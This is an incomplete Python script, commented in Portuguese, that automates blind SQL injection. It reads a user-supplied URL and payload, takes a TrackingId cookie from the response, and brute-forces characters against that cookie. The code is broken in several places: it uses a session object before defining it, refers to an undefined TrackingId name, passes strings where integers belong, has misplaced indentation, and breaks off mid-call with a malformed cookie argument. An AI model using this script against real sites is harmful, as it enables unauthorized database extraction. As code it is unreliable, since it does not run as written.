#!/bin/env python3

"""
Script Automação Blind SQLi

"""

import requests
from requests.adapters import HTTPAdapter
import string
import time
import re

url = input("Informe a URL:")

#Faz a requisição para a url informada.
response = requests.get(url)

#Gera o Payload
payload = input("Informe o payload que acompanhará o cookie (Especifique onde os parametros devem ser incluídos utilizando ""$"", se houver mais de um parametro, utilize o valor da posição exemplo ""$1...$2...""): ")

#Define o tamanho do pool de requisições
max_connections = input("Informe o tamanho do pool de requisições")
adapter = HTTPAdapter(pool_connections=max_connections, pool_maxsize=max_connections)

# Montar o adaptador da sessão
session.mount('http://', adapter)
session.mount('https://', adapter)

# Pega o cookie da requisição.
tracking_id = response.cookies.get(TrackingId)
print(f"Cookie recebido: {tracking_id}")

# Contador do pool de requisições
cont_init = 1
cont_end = input("Informe o valor final da contagem (A contagem inicia sempre pelo 1 -- É possível modificá-la pelo script)): ")

# Substitui as posições do payload pelos valor 

# Inicio da contagem de reposta das requisições
start = time.time()

def injectsql():

"""     Função: Resultado SQLi no formulário da pagina      """
        session = requests.Session()
        #Defina os caracteres usados para o brute force
        numbers = '0123456789'
        characteres = string.ascii_letters + numbers
        l = 1
        flag = ''
        # Iterando para o tamanho do campo
        while cont_init <= cont_end:
        
# Comparar o caracter para encontrar o compatível com sua posição
            for c in characteres:
                request = session.get(url, cookies={tracking_id+payload}
